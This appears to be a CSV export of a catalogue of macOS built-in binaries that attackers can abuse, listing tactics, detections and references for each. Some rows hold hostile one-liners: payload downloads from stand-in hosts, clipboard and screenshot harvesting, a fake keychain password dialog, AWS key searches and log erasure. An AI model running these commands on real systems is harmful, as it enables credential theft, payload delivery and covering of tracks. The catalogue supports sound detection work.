"name","author","short_description","full_description","created","example_use_cases","example_use_cases_name","example_use_cases_description","example_use_cases_code","example_use_cases_tactics","example_use_cases_tags","paths","detections","detections_name","detections_url","resources","resources_name","resources_url","acknowledgements","is_legit"
"scutil","Ethan Nay","Display basic network information, check the dns config, set the computer hostname and perform several other tasks.","scutil provides a command line interface to the dynamic store data maintained by configd. Interaction with this data (using the SystemConfiguration.framework SCDynamicStore APIs) is handled with a set of commands read from standard input.","2023-06-21","","[''DNS configuration''-|-''Proxy configuration''-|-''Network reachability''-|-''Hostname, localhost name and computername'']","[''Get the current DNS configuration of the systems''-|-''Get the current proxy configuration of the systems''-|-''Check if the destination host is reachable from your Mac''-|-''Display the current hostname, localhost name and computername'']","[''scutil --dns''-|-''scutil --proxy''-|-''scutil -r { nodename | address | local-address remote-address }''-|-''scutil --get { HostName | LocalHostName | ComputerName }'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery'']","[''network''-|-''network''-|-''configuration''-|-''network''-|-''configuration''-|-''configuration'']","/usr/bin/scutil","","No detections at time of publishing","N/A","","[''macOS/binaries/scutil''-|-''scutil man page'']","[''https://macosbin.com/bin/scutil''-|-''https://ss64.com/osx/scutil.html'']","","false"
"screencapture","Brendan Chamberlain (@infosecB)","Capture a screenshot from command line.","A tools that allows users to take screenshots of their desktop or specific app windows. The tool can be used by malicious actors to collect sensitve information from the targeted system.","2023-04-27","","Continously capture screenshots","The following command demonstrates how an attacker can use the tool to capture screenshots every 10 seconds. The -x flag prevents snapshot sounds from being played.","while true; do ts=$(date +""%Y%m%d-%H%M%S""); o=""/tmp/screenshots""; screencapture -x ""$o/ss-$ts.png""; sleep 10; done","Collection","oneliner","/usr/sbin/screencapture","","Sigma: Screen Capture - macOS","https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_screencapture.yml","","SS64 screencapture man page","https://ss64.com/osx/screencapture.html","","false"
"say","Pinar Sadioglu (@p_sadioglu)","Convert text to audible speech.","This tool uses the Speech Synthesis manager to convert input text to audible speech and either play it through the sound output device chosen in System Preferences or save it to an AIFF file.","2023-11-17","","[''Read sensitive data''-|-''Collect clipboard data'']","[''The following command can read and process sensitive files and redirects the output to a file..''-|-''The command is designed to enhance privacy by muting the system volume,using a less recognizable ""Whisper"" voice with the ""say"" command, processing the copied text in the clipboard, and saving the output to a file named ""loot.txt.""'']","[''say -f /home/user/sensitive-files -i  > loot.txt;''-|-''osascript -e 'set volume output muted true' ;   say $(pbpaste) -i  > loot.txt;'']","[''Defense Evasion''-|-''Collection''-|-''Defense Evasion''-|-''Reconnaissance''-|-''Discovery''-|-''Collection'']","[''bash''-|-''pbpaste''-|-''clipboard''-|-''bash''-|-''osascript'']","/usr/bin/say","","No detection content available","N/A","","say man page","https://ss64.com/osx/say.html","","false"
"safaridriver","Brendan Chamberlain (@infosecB)","Enable the WebDriver Safari browser API for Selenium testing.","safaridriver is a tool that is used to enable Selenium testing via the macOS WebDriver protocol. Once enabled, the WebDriver API could be abused by attackers to communicate with external servers for command and control or exfiltration purposes.","2023-05-20","","Enable safaridriver","The following command can be used to enable the WebDriver Safari browser API. The command must be run as root or with sudo privileges.","sudo safaridriver --enable","[''Command and Control''-|-''Exfiltration'']","[''safari''-|-''selenium'']","[''/System/Cryptexes/App/usr/bin/safaridriver''-|-''/usr/bin/safaridriver'']","","No detections at time of publishing","N/A","","[''About WebDriver for Safari''-|-''You Talking To Me?'']","[''https://developer.apple.com/documentation/webkit/about_webdriver_for_safari''-|-''https://starlabs.sg/blog/2021/04-you-talking-to-me/'']","Chris Ross, Cedric Owens: Farming The Apple Orchards: Living Off The Land Techniques","false"
"profiles","Will Huang (@In0de_16)","List and remove configuration profiles.","Profiles on macOS are responsible for managing different types of profiles including configuration, provisioning, bootstraptoken, or enrollment. However, starting from macOS 11.0, this tool cannot be used for installing configuration profiles.","2023-05-16","","[''Collect system DEP information.''-|-''Remove configuration profiles.'']","[''The following command determines whether device is DEP(Device Enrolment Program) enabled and output the DEP information.''-|-''The following command deletes the specified profiles. An optional password used when removing a configuration profile which requires the password removal option.'']","[''sudo profiles show -type enrollment''-|-''profiles remove -identifier com.profile.identifier -password <password>'']","[''Discovery''-|-''Impact'']","[''oneliner''-|-''oneliner'']","/usr/bin/profiles","","No detections at time of publishing.","N/A","","macOS MDM introduction.","https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-mdm","","false"
"plutil","Brendan Chamberlain (@infosecB)","Read, create or edit plist files.","plutil is a command-line utility used for managing property list (.plist) files. These files are commonly used by macOS to store a app settings and other configuration info. The utility allows users to check the validity of plist files `plutil -lint`, convert plist files between XML and binary formats (plutil -convert), and add, modify or remove plist key value pairs.","2023-05-07","","Set app to run with dock icon hidden","plutil can be used to set the ""LSUIElement"" attribute to tue which will force the targeted app to run without the UI and dock icon.","plutil -insert LSUIElement -string ""1"" /Applications/TargetApp.app/Contents/Info.plist","Defense Evasion","plist","/usr/bin/plutil","","Splunk Security Content: MacOS plutil","https://research.splunk.com/endpoint/c11f2b57-92c1-4cd2-b46c-064eafb833ac/","","[''Editing Property Lists with plutil''-|-''Plist File Modification (MITRE ATT&CK)'']","[''https://scriptingosx.com/2016/11/editing-property-lists/''-|-''https://attack.mitre.org/techniques/T1647/'']","","false"
"pbpaste","Brendan Chamberlain (@infosecB)","Paste the contents of clipboard to the terminal.","Retrieves the contents of the clipboard (a.k.a. pasteboard) and writes them to the standard output (stdout). The utility is often used for creating new files with the clipboard content or for piping clipboard contents to other commands. It can also be used in shell scripts that may require clipboard content as input.","2023-04-11","","Use pbpaste to collect sensitive clipboard data","A pbpaste bash loop can continously collect clipboard contents every x minutes and write contents to a file (or another location). This may allow an attacker to gather user credentials or collect other sensitive information.","while true; do echo $(pbpaste) >> loot.txt; sleep 10; done","[''Credential Access''-|-''Collection'']","[''bash''-|-''oneliner'']","/usr/bin/pbpaste","","Sigma: Clipboard Data Collection Via Pbpaste","https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/macos/process_creation/proc_creation_macos_pbpaste_execution.yml","","[''Hacking macOS: How to Dump 1Password, KeePassX & LastPass Passwords in Plaintext''-|-''Living-off-the-Land: Exploring macOS LOOBins and Crafting Detection Rules - pbpaste'']","[''https://medium.com/@NullByteWht/hacking-macos-how-to-dump-1password-keepassx-lastpass-passwords-in-plaintext-723c5b1c311b''-|-''https://danielcortez.substack.com/p/living-off-the-land-exploring-macos-b65'']","","false"
"osascript","Cedric Owens (@cedowens)","Execute AppleScripts and other OSA language scripts and commands.","The osascript binary is a command-line utility included in macOS that allows users to run AppleScript and Open Scripting Architecture (OSA) scripts or commands. AppleScript is a scripting language that is designed for power users to automate various tasks, application actions, and to interact with the operating system.","2023-04-19","","[''Use the osascript binary to gather sensitive clipboard data''-|-''Use the osascript binary to gather system information''-|-''Use the osascript binary to prompt the user for credentials''-|-''Use the osascript binary to execute a JXA (JavaScript for Automation) file.'']","[''A bash loop can gather clipboard contents over a defined time period. The following command calls /usr/bin/osascript -e 'return (the clipboard)' indefinitely every 10 seconds and writes clipboard content to a text file.''-|-''osascript can be used to gather the operating system version, current username, user ID, computer name, IP address, and other information.''-|-''osascript can be used to generate a dialogue box and request the user to enter the keychain password.''-|-''JXA is often used by red teams (and potentially attackers) as a macOS payload, as JXA is native to macOS and can access various internal macOS APIs (such as Cocoa, Foundation, OSAKit, etc.). The osascript binary can be used to execute JXA payloads by simply running ""osascript [file.js]"" but some malware or offensive tools may also use ""osascript -l JavaScript [file.js]"".'']","[''while true; do echo $(osascript -e 'return (the clipboard)') >> clipdata.txt; sleep 10; done''-|-''osascript -e 'return (system info)'''-|-''osascript -e 'set popup to display dialog ""Keychain Access wants to use the login keychain"" & return & return & ""Please enter the keychain password"" & return default answer """" with icon file ""System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns"" with title ""Authentication Needed"" with hidden answer'''-|-''echo ""ObjC.import('Cocoa');\nObjC.import('stdlib');\nvar currentApp = Application.currentApplication();\ncurrentApp.includeStandardAdditions = true;\ncurrentApp.doShellScript('open -a Calculator.app');"" > calc.js && osascript -l JavaScript calc.js'']","[''Collection''-|-''Credential Access''-|-''Collection''-|-''Discovery''-|-''Credential Access''-|-''Execution'']","[''clipboard''-|-''bash''-|-''oneliner''-|-''osascript''-|-''systeminfo''-|-''oneliner''-|-''osascript''-|-''oneliner''-|-''prompt''-|-''osascript''-|-''jxa''-|-''osascript'']","/usr/bin/osascript","","[''Command Line Argument Detection (args contain osascript AND -e AND clipboard)''-|-''Jamf Protect: Detect activity that is related to osascript gathering clipboard content''-|-''Jamf Protect: Detect activity that is related to osascript pulling system information''-|-''Jamf Protect: Detect activity that is related to generating dialogs using osascript and asking for specific user input'']","[''N/A''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_gather_clipboard''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_gather_system_information''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_dialog_activity'']","","Using macOS Internals for Post Exploitation","https://medium.com/red-teaming-with-a-blue-team-mentality/using-macos-internals-for-post-exploitation-b5faaa11e121","","false"
"osacompile","Brendan Chamberlain (@infosecB)","Compile AppleScripts or OSA language scripts.","osacompile is a utility used to compile scripts into executables. It's a component of Open Scripting Architecture (OSA) that Apple uses for its scripting languages, like AppleScript and JavaScript for Automation (JXA). osacompile accepts AppleScript code as input and produces a compiled script file, which can be either a script file (.scpt), an app (.app), a droplet, or a script bundle.","2023-05-14","","Download and compile a payload","The following command downloads an applescript payload from getpayload.com and compiles it into an app.","curl https://getpayload.com/payload_code.apple_script && osacompile -x -e payload_code.apple_script -o payload.app","[''Command and Control''-|-''Resource Development'']","XCSSET","/usr/bin/osacompile","","Sigma: In-Memory Download And Compile Of Payloads (experimental/pending)","https://github.com/SigmaHQ/sigma/pull/4127/commits/f4b0264a83e5f47473029e26dc0879fb196a7d07","","A bundle of nerves: Tweaking macOS security controls to thwart application bundle manipulation","https://redcanary.com/blog/mac-application-bundles/","","false"
"open","Brendan Chamberlain (@infosecb)","Open files, folders, apps, URLs, and header files.","The open command-line utility can be used to open files, folders, app, URLs or header files in their associate macOS app.","2023-05-10","","[''Open a malicious file''-|-''Download a malicious file'']","[''The open command can be used to open a malicious macOS app from the terminal.''-|-''The following command downloads the payload.zip file in the default browser (Safari) and then kills it.'']","[''open Malicious.app''-|-''open -g https://mypayload.io/payload.zip; sleep 3; killall Safari'']","[''Execution''-|-''Execution'']","app","/usr/bin/open","","No detections at time of publishing","N/A","","The macOS open Command","https://scriptingosx.com/2017/02/the-macos-open-command/","","false"
"odutil","Ethan Nay","odutil allows caller to examine or change state of opendirectoryd","To look at internal state information for opendirectoryd, enable or disable logging, or change statistics settings.","2023-07-12","","[''Listing the available node names''-|-''Retrieves active session''-|-''Retrieves ""Default search policy""''-|-''Retrieves ""Contact search policy""'']","[''List all available node names''-|-''Retrieves the all active sessions''-|-''Retrieves the configuration of ""Default search policy""''-|-''Retrieves the configuration of ""Contact search policy""'']","[''odutil show nodenames''-|-''odutil show sessions''-|-''odutil show configuration /Search''-|-''odutil show configuration /Contacts'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery'']","[''bash''-|-''zsh''-|-''bash''-|-''zsh''-|-''bash''-|-''zsh''-|-''bash''-|-''zsh'']","/usr/bin/odutil","","No detections at time of publishing","N/A","","[''macOS/binaries/odutil''-|-''odutil man page'']","[''https://macosbin.com/bin/odutil''-|-''https://www.unix.com/man-page/osx/1/odutil/'']","","false"
"nvram","Brendan Chamberlain (@infosecB)","Access and manage the host's non-volatile random-access memory (NVRAM).","Access and manage the host's non-volatile random-access memory (NVRAM).","2023-05-23","","Get nvram variables","The -p option prints all the nvram variables that contain some potentially sensitive information like WiFi SSIDs and Bluetooth devices.","nvram -p","Discovery","","/usr/sbin/nvram","","No detections at time of publishing.","N/A","","SS64 man page","https://ss64.com/osx/nvram.html","Jonathan Bar Or (@yo_yo_yo_jbo)","false"
"nscurl","Leo Pitt (@_D00mfist)","Download, upload, and read files.","macOS version of curl that is used to download files to a target without applying the quarantine extended attribute","2023-05-22","","[''Download file''-|-''Download file''-|-''Download file'']","[''Download file and ignore cert checking''-|-''Download file to the Downloads directory using -dl''-|-''Download file to a designated directory using -dir'']","[''nscurl -k https://google.com -o /private/tmp/google''-|-''nscurl https://google.com -dl''-|-''nscurl https://google.com -dir /private/tmp/google'']","[''Defense Evasion''-|-''Command and Control''-|-''Defense Evasion''-|-''Command and Control''-|-''Defense Evasion''-|-''Command and Control'']","","/usr/bin/nscurl","","[''Jamf Protect: Detect all curl and nscurl activity''-|-''Jamf Protect: Detect file downloads using the insecure argument for curl and nscurl''-|-''Sigma: File Download Via Nscurl - MacOS'']","[''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/all_curl_activity''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/file_download_curl_insecure''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_nscurl_usage.yml'']","","[''How to Diagnose App Transport Security Issues using nscurl and OpenSSL''-|-''Living-off-the-Land: Exploring macOS LOOBins and Crafting Detection Rules - nscurl'']","[''https://www.agnosticdev.com/content/how-diagnose-app-transport-security-issues-using-nscurl-and-openssl''-|-''https://danielcortez.substack.com/p/living-off-the-land-exploring-macos'']","","false"
"networksetup","Jason Trost (@jason_trost)","Configure network settings in System Preferences.","networksetup extensive tool for reading and setting various network configuration details useful for Discovery and Command and Control.","2023-04-22","","[''network device enumeration''-|-''Detect connected network hardware''-|-''network device enumeration''-|-''network device enumeration''-|-''DNS server enumeration''-|-''Enumerate configured web proxy URL for an interface''-|-''Enumerate configured web proxy for an interface''-|-''Set the https web proxy for an interface''-|-''Set the http web proxy for an interface''-|-''Set auto proxy URL for an interface''-|-''Enable auto proxy state'']","[''Use networksetup to display services with corresponding port and device in order they are tried for connecting to a network.''-|-''Use networksetup to detect new network hardware and create a default network service on the hardware.''-|-''Use networksetup to list all network interfaces, providing name, device name, MAC address.''-|-''Use networksetup to list all network interface names.''-|-''Use networksetup to get configured DNS servers for a specific interface.''-|-''Displays web proxy auto-configuration information for the specified interface.''-|-''Displays standard web proxy information for the specified interface.''-|-''Use networksetup to set the https web proxy for an interface.''-|-''Use networksetup to set the http web proxy for an interface.''-|-''Use networksetup to set the proxy URL for an interface.''-|-''Use networksetup to enable the proxy auto-config'']","[''networksetup -listnetworkserviceorder''-|-''networksetup -detectnewhardware''-|-''networksetup -listallhardwareports''-|-''networksetup -listallnetworkservices''-|-''networksetup -getdnsservers Wi-Fi''-|-''networksetup -getautoproxyurl ""Thunderbolt Ethernet""''-|-''networksetup -getwebproxy ""Wi-Fi""''-|-''networksetup -setsecurewebproxy ""Wi-Fi"" 46.226.108.171''-|-''networksetup -setwebproxy ""Wi-Fi"" 46.226.108.171''-|-''networksetup -setautoproxyurl ""Wi-Fi"" $autoProxyURL''-|-''networksetup -setautoproxystate ""Wi-Fi"" on'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Command and Control''-|-''Command and Control''-|-''Command and Control''-|-''Command and Control'']","[''network''-|-''configuration''-|-''network''-|-''configuration''-|-''network''-|-''configuration''-|-''network''-|-''configuration''-|-''network''-|-''configuration''-|-''dns''-|-''network''-|-''configuration''-|-''proxy''-|-''network''-|-''configuration''-|-''proxy''-|-''network''-|-''configuration''-|-''proxy''-|-''network''-|-''configuration''-|-''proxy''-|-''network''-|-''configuration''-|-''proxy''-|-''network''-|-''configuration''-|-''proxy'']","/usr/sbin/networksetup","","No detections at time of publishing","N/A","","[''Threat Hunting the macOS edition Megan Carney (Report)''-|-''GrrCon 2018: Threat Hunting the macOS edition Megan Carney''-|-''Mac Malware of 2017 - a comprehensive analysis of the new mac malware of 17''-|-''Ay MaMi - Analyzing a New macOS DNS Hijacker: OSX/MaMi''-|-''Analyzing OSX.DazzleSpy - A fully-featured cyber-espionage macOS implant''-|-''The Mac Malware of 2018 - a comprehensive analysis of the new mac malware of - 18''-|-''From The DPRK With Love - analyzing a recent north korean macOS backdoor'']","[''https://megancarney.com/presentations/ExternalReport_ThreatHuntingMacOS.pdf''-|-''https://www.youtube.com/watch?v=_K4gnSuDkRM&feature=youtu.be''-|-''https://objective-see.org/blog/blog_0x25.html''-|-''https://objective-see.org/blog/blog_0x26.html''-|-''https://objective-see.org/blog/blog_0x6D.html''-|-''https://objective-see.org/blog/blog_0x3C.html''-|-''https://objective-see.org/blog/blog_0x6E.html'']","","false"
"mktemp","Tim Peck (@B0bby_Tablez)","Create a temporary file or directory and return the file/directory name to stdout","The mktemp binary located in ""usr/bin/mktemp"" can generate unique directory or file names and has historically been used to generate unique payloads.","2023-06-28","","[''Generate payload directory (Shlayer)''-|-''Generate directory based on template file (Bundlore)'']","[''The following command can be used to generate a random directory name for staging payloads''-|-''The following command can be used to generate a unique directory based on a template'']","[''export tmpDir=""$(mktemp -d /tmp/XXXXXXXXXXXX)""''-|-''TMP_DIR=""mktemp -d -t x""'']","[''Defense Evasion''-|-''Defense Evasion'']","[''Payload''-|-''Payload'']","/usr/bin/mktemp","","No detections at time of publishing","N/A","","[''Shlayer malware abusing Gatekeeper bypass on macOS''-|-''20 Common Tools & Techniques Used by macOS Threat Actors & Malware'']","[''https://www.jamf.com/blog/shlayer-malware-abusing-gatekeeper-bypass-on-macos/''-|-''https://www.sentinelone.com/labs/20-common-tools-techniques-used-by-macos-threat-actors-malware/'']","","false"
"mdls","Daniel Stinson-Diess (@shellcromancer)","List metadata attributes for the specified file.","mdls list file metadata across standard metadata (creation date, size), extended attribute (quarantine), and Spotlight APIs (Finder flags).","2023-05-29","","[''Validate file download information''-|-''Query File Paths'']","[''Use mdls to validate payload download sources and timestamps to guard against sandbox executions.''-|-''Use mdls to print file paths and sizes when enumerating host resources.'']","[''mdls -name ""kMDItemWhereFroms"" -name ""kMDItemDownloadedDate""''-|-''xargs -0 mdls -n kMDItemPath -n kMDItemFSSize'']","[''Defense Evasion''-|-''Discovery'']","[''Genieo''-|-''Shlayer''-|-''CleanMaster'']","/usr/bin/mdls","","No detections at time of publishing","N/A","","","","","false"
"mdfind","Chris Campbell (@texasbe2trill)","Locate files using the Spotlight database.","mdfind to locate files on MacOS by searching a pre-built database. It is a command-line alternative to Spotlight in MacOS","2023-04-22","","[''Use mdfind to provide live updates to the number of files matching the query''-|-''Use mdfind to search for AWS Keys''-|-''Use mdfind to search for apps to infect'']","[''A bash or zsh oneliner can cause mdfind to provide an attacker with live updates to the number of files on a system.''-|-''Allows an attacker to query the filesystem via the CommandLine/Terminal to search for AWS keys.''-|-''Allows an attacker to determine if specific applications are installed and can be leveraged'']","[''mdfind -live passw''-|-''mdfind 'kMDItemTextContext == AKIA || kMDItemDisplayName = *AKIA* -onlyin ~'''-|-''set appId to do shell script ""mdfind kMDItemCFBundleIdentifier = '"" & bundleId & ""'""'']","[''Reconnaissance''-|-''Discovery''-|-''Reconnaissance''-|-''Discovery''-|-''Reconnaissance''-|-''Discovery''-|-''Defense Evasion'']","[''bash''-|-''zsh''-|-''oneliner''-|-''bash''-|-''zsh''-|-''oneliner''-|-''osascript''-|-''XCSSET'']","/usr/bin/mdfind","","Jamf Protect: Detect activity related to mdfind used to search for stored AWS keys","https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/mdfind_search_aws_keys","","[''""Farming The Apple Orchards: Living off the Land Techniques"" - Chris Ross & Cedric Owens''-|-''""Zero-Day TCC bypass discovered in XCSSET malware"" - Jaron Bradley, Ferdous Saljooki, Stuart Ashenbrenner'']","[''https://youtu.be/Snwh4mMe-Cg?t=45''-|-''https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/'']","","false"
"lsregister","Brendan Chamberlain (@infosecB)","Interact with the macOS Launch Services database.","lsregister is used to build, dump, and check the validity of the Launch Services database. This database is often abused to create custom URL scheme handlers that point to malicious apps.","2023-05-15","","[''Force an update of the Launch Services database''-|-''Get a list of apps and their bindings''-|-''Delete the Launch Services database'']","[''The -f flag can be used to force an update of the Launch Services database. This can be used to quickly register a custom URL scheme that points to a malicious app.''-|-''The -dump flag can be used to get a list of apps and their bindings''-|-''The -delete flag can be used to delete the Launch Services database to impact normal operation of the system.'']","[''/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -f''-|-''/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -dump | grep -E ""path:|bindings:|name: | more""''-|-''lsregister -delete'']","[''Discovery''-|-''Discovery''-|-''Impact'']","","/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister","","No detections at time of publishing","N/A","","[''Remote Mac Exploitation Via Custom URL Schemes''-|-''macOS Security & Privilege Escalation'']","[''https://www.jamf.com/blog/remote-mac-exploitation-via-custom-url-schemes/''-|-''https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation'']","Patrick Wardle (@patrickwardle)","false"
"log","Brendan Chamberlain (@infosecB)","Access system log messages from Apple Unified Logging (AUL).","The log command can be used to access system log messages from Apple Unified Logging (AUL). The tool can be used to inspect exiting logs, stream logs in realtime, and delete logs. This tool is normally used by system admins and application developers for troubleshooting purposes but can be used by an adversary to gain an understanding of the user's behavior or to cover up their tracks by deleting log messages.","2023-06-06","","[''Remove all log messages''-|-''Search log messages for tokens'']","[''An attacker can cover up their tracks by removing all log messages using the following command. Requires root privileges.''-|-''An attacker can potentially search log messages and review if they do contain sensitive information like jwt tokens.'']","[''log erase --all''-|-''log show --info --debug --predicate 'eventMessage CONTAINS[d] ""eyJ""''']","[''Defense Evasion''-|-''Credential Access'']","[''requires_root''-|-''bash''-|-''zsh'']","/usr/bin/log","","No detections at time of publishing","N/A","","Living off the land in macOS (Daniel Stinson)","https://shellcromancer.io/posts/living-off-of-macos/","Daniel Stinson (@shellcromancer)","false"
